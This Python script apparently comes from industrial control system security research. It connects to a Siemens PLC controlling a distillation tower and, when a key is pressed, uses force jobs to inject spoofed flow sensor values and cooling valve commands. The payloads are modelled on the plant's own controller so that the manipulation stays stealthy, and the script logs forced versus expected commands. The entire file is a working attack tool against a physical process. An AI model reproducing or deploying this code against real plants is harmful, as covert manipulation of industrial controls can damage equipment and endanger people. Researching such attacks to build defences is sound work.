from typing import Tuple
from numpy.lib.npyio import save
import siemens
import time
from sys import exit
import random
import math
import PLCrecover.ForceConnect
from multiprocessing import Process, process

import numpy as np
from scipy.io import savemat
from datetime import datetime


import keyboard




def readVars(plc, vars_index_dict):
	data_dict = plc.plc_read_data(vars_index_dict["I"], vars_index_dict["Q"], vars_index_dict["DB"])
	return data_dict

def ForceVars(plc, PLC_PORT, PLC_IP, forceaddrs, forcevalue, init = False, cancle_attack = False) :
	# some_params_you_may_need:
	# for any block, format is [db_num, start_byte, data], data must be bytearray
	# the format of writing a data to PLC: [0, 110, 10000] --- "0" is default 0 for I/Q; 
	# "100" is the offset of address; 10000 is the writing data 
	if init:
		# create job
		# addrs = ['IW110']
		# vals = [7000]
		proc0 = Process(target=PLCrecover.ForceConnect.createForceJob, args=(PLC_IP, PLC_PORT, forceaddrs, forcevalue))
		proc0.start()

	elif cancle_attack:
		# delete job
		proc = Process(target=PLCrecover.ForceConnect.deleteForceJob, args=(PLC_IP, PLC_PORT))
		proc.start()
	else:
		# keep replacing the forced value to PLC 
		# vals = [6300]
		proc1 = Process(target=PLCrecover.ForceConnect.replaceForceJob, args=(PLC_IP, PLC_PORT, forceaddrs, forcevalue))
		proc1.start()

	# return write_vars_dict




def Attacker_SCADA(read_vars_value_dict,  flow_x_pre, flow_x_est, feeding_x_pre, feeding_x_est, att_condi = False, initialzation = False) :
	# based on the sensor reading, build the state estimation to predict the command

	# rearrange the range for sensor readings 
	# loop-2 the gas condensing loop
	setpoint_flow = read_vars_value_dict["DB"][0][0] 
	cooling_flow = read_vars_value_dict["I"][0][0] / 27648 *12 + 0 
	cooling_valve = read_vars_value_dict["Q"][0][0] / 27648 *100 + 0
	flow_error = setpoint_flow - cooling_flow 
	# loop-3 the tower liquid level loop 
	setpoint_level = read_vars_value_dict["DB"][1][0] 
	liquid_level = ( read_vars_value_dict["I"][1][0] -1328) / 27648 *4 - 2
	material_valve = read_vars_value_dict["Q"][1][0] / 27648 *100 + 0
	level_error = setpoint_level - liquid_level 


	# the control parameters are trained offline, using the system idenfication toolbox --- i.e., the linear least square 
	# condensing_paras = [1, 1, 0.2411, 0.1359, 0.000013754]
	condensing_paras = [1, 1, 0.9273, 0.4388, 0.0002] 
	feeding_paras = [1.0021, 1, 72.1622, 36.1825, 0.0468]

	if initialzation:
		flow_x_pre = (cooling_valve - condensing_paras[3]*flow_error) / condensing_paras[2]
		flow_x_est = flow_x_pre
		feeding_x_pre = (material_valve - feeding_paras[3]*level_error ) / feeding_paras[2]
		feeding_x_est = feeding_x_pre


	# predict command, update the innvation for condensing loop 
	# [flow_payload, flow_inno_att, flow_x_pre, flow_x_est] = flow_estimation
	flow_estimation = online_payload_generation(condensing_paras, cooling_valve, flow_error, flow_x_pre, flow_x_est, attack_condition= att_condi) 
	flow_estimation = list(flow_estimation)
	

	# predict command, update the innvation for material feeding loop 
	# [level_payload, level_inno_att, feeding_x_pre, feeding_x_est] = level_estimation
	level_estimation = online_payload_generation(feeding_paras, material_valve, level_error, feeding_x_pre, feeding_x_est, attack_condition= False) 
	level_estimation = list(level_estimation)
	
	flow_estimation[0] = round(flow_estimation[0]/100*27648) # the command payload
	flow_estimation[4] = round(flow_estimation[4]/12*27648) # the sensor payload for flow loop
	# flow_estimation[4] = read_vars_value_dict["I"][0][0] # send the attacker logged sensor readings to PLC

	level_estimation[0] = round(level_estimation[0]/100*27648) # the command payload
	
	
	return flow_estimation, level_estimation



def online_payload_generation(loop_paras, u_read, e_read, x_pre, x_est, attack_condition= False) :
	# predict control command "u_pre",  the estimation innvation "z"
	# based on the customized_SCADA reading 

	# controller parameters 
	A = loop_paras[0]
	B = loop_paras[1]
	C = loop_paras[2]
	D = loop_paras[3]
	Z_var = loop_paras[4]

	# if not launch the attack 
	u_att = u_read

	
	# predict the control command 
	u_pre = C * x_pre + D * e_read

	forcedsensor=0 # modified by Zeyu @ 2023.12.10
	# calculate the innovation, and update the state estimation 
	if u_pre < 5.03:
		u_pre = 5.03
		inno_att = u_read - u_pre
		x_pre =  A * x_est + B * e_read 
	elif u_pre > 95:
		u_pre = 95
		inno_att = u_read - u_pre
		x_pre =  A * x_est + B * e_read 
	else:
		inno_att = u_read - u_pre
		if attack_condition:
			# e_read = round((random.gauss(0, math.pow(0.0001, 0.5)))/0.0035)*0.0035
			e_read = (random.gauss(0, 0))
			delta_u = random.gauss(0, math.pow(Z_var/2, 0.5))
			# u_att = u_pre
			u_att = u_pre + round(delta_u/0.01) * 0.01 -0.001
			
			inno_att = u_att - u_pre
		
		forcedsensor = 5.0-e_read

		x_est = x_pre + 1/C * inno_att 
		x_pre =  A * x_est + B * e_read 


	return u_att, inno_att, x_pre, x_est, forcedsensor






if __name__ == '__main__':
	# setup for connection
	# plc = siemens.SIEMENSPLC("192.168.0.2", "elevator")
	PLC_PORT = 102
	PLC_IP = "192.168.10.222"

	plc = siemens.SIEMENSPLC("192.168.10.222", "distillation tower")
	plc.plc_connect()
	if not plc.check_connection:
		print('\nERROR with connection')
		exit()

	# Loop-1 Temperature control: IW108 is for the "heater temp.", Q1.2 is for the "heater switch"
	# Loop-2 Gas condensing control: IW94 is for the "cooling water flow", IW110 is for the "tower liquid level", 
	# Loop-3 Tower liquid level control: QW74 is for the "cooling water valve", QW70 is for the "material input valve", 

	# for any block, format is [db_num, start_byte, size_of_bytes], e.g., "Q":[[0, 0, 1], [0, 2, 1]] reads the first and third byte of Q
	read_vars_dict = {"I":[[0, 94, 2], [0, 110, 2]], "Q":[[0, 74, 2], [0, 70, 2]], "DB":[[10, 2, 4], [13, 2, 4], [10, 30, 4], [13, 30, 4]]}
	
	initialize = True

	att_condi = False # default should be false

	attack_init = True 
	cancle_attack = False
	
	command_Attacker_forced = []
	command_System_expected = []
	att_count = 0
	while (True):
		try:
			# read vars
			read_vars_value_dict = readVars(plc, read_vars_dict)

			expected_flow_u = read_vars_value_dict["DB"][2][0] 
			# expected_level_u = read_vars_value_dict["DB"][3][0] 


			# print(read_vars_value_dict)
			# # YOUR LOGIC HERE -- anything helpful
			if initialize:
				flow_x_pre = 0
				flow_x_est = 0 
				feeding_x_pre = 0 
				feeding_x_est = 0
				[flow_estimation, level_estimation] = Attacker_SCADA(read_vars_value_dict,  flow_x_pre, flow_x_est, feeding_x_pre, feeding_x_est, att_condi = False, initialzation = True)
				[flow_payload, flow_inno_att, flow_x_pre, flow_x_est, flow_sensor] = flow_estimation 
				[level_payload, level_inno_att, feeding_x_pre, feeding_x_est, level_sensor]  = level_estimation

				initialize=False
			else:
				[flow_estimation, level_estimation] = Attacker_SCADA(read_vars_value_dict,  flow_x_pre, flow_x_est, feeding_x_pre, feeding_x_est, att_condi, initialzation = False )
				[flow_payload, flow_inno_att, flow_x_pre, flow_x_est, flow_sensor] = flow_estimation 
				[level_payload, level_inno_att, feeding_x_pre, feeding_x_est, level_sensor]  = level_estimation



			if keyboard.is_pressed('s'):
				att_condi = True
			elif keyboard.is_pressed('q'):
				cancle_attack = True


			
			# if att_condi:
			if att_condi:
				# both sensor and command need to be forced to the PLC 
				# IW94: the flow sensor; Qw74: the cooling water valve
				

				if att_count < 5:

					forceaddrs = ["IW94"]
					forcevalue = [flow_sensor]
						
					# set the keyboard trigger 
					if att_count == 0:
						ForceVars(plc, PLC_PORT, PLC_IP, forceaddrs, forcevalue, attack_init, cancle_attack)
						print("attack started")
						attack_init=False
						att_count = att_count+1
						
					elif att_count == 10: 
						cancle_attack = True
						ForceVars(plc, PLC_PORT, PLC_IP, forceaddrs, forcevalue, attack_init, cancle_attack)
						att_count = att_count+1
						print("sensor attack cancled")
						
						attack_init=True
						cancle_attack = False
					else:
						ForceVars(plc, PLC_PORT, PLC_IP, forceaddrs, forcevalue, attack_init, cancle_attack)
						att_count = att_count+1
						
						
				else:
					forceaddrs = ["IW94", "QW74"]
					forcevalue = [flow_sensor, flow_payload]
					

					# set the keyboard trigger 
					if attack_init:
						ForceVars(plc, PLC_PORT, PLC_IP, forceaddrs, forcevalue, attack_init, cancle_attack)
						print("attack started")
						attack_init = False

					elif cancle_attack:
						att_condi = False 
						ForceVars(plc, PLC_PORT, PLC_IP, forceaddrs, forcevalue, attack_init, cancle_attack=True)
						print("attack cancled")
						
					else:
						ForceVars(plc, PLC_PORT, PLC_IP, forceaddrs, forcevalue, attack_init, cancle_attack)


					print("the forced cooling water flow is: {}".format(flow_sensor))
					print("the attacker forced cooling command is: {}".format(flow_payload))
					command_Attacker_forced.append(flow_payload)
					print("the attacker forced cooling command is: {}".format(flow_payload / 27648 *100))
					print("the normal PLC cooling command is: {} \n".format(expected_flow_u))
					command_System_expected.append(expected_flow_u)
					# print("the command prediction error is: {}%".format(flow_inno_att))
				
			else:
				print("the monitored cooling water flow is: {}".format(flow_sensor))
				print("the attacker logged cooling command is: {}".format(flow_payload))
				command_Attacker_forced.append(flow_payload)
				print("the attacker logged cooling command is: {}".format(flow_payload / 27648 *100))
				print("the normal PLC cooling command is: {}% \n".format(expected_flow_u))
				command_System_expected.append(expected_flow_u)
				# print("the command prediction error is: {}% ".format(flow_inno_att))

			# time.sleep(0.5)  # in secs (float)
			
			# the force interval is 0.5s
			time_now = time.time()
			while(time.time() - time_now < 1):
				time.sleep(0.001)

		except KeyboardInterrupt as e:
			print('\nKeyboardInterrupt')
			
			Stealthy_attack = {"command_Attacker_forced":command_Attacker_forced, "command_System_expected":command_System_expected}
			savemat(".\StealthyAttack\Stealthy_attack" + str(datetime.now().strftime("-%y-%m-%d-%H-%M-%S")) + ".mat", Stealthy_attack) 
			print('\nStealthyAttack data saved!')

			plc.plc_disconnect()
			
			# if the keyboard input for attack_cancel has been implemented, the following two line can be omitted
			ForceVars(plc, PLC_PORT, PLC_IP, forceaddrs, forcevalue, attack_init, cancle_attack = True)
			time.sleep(2)

			exit()
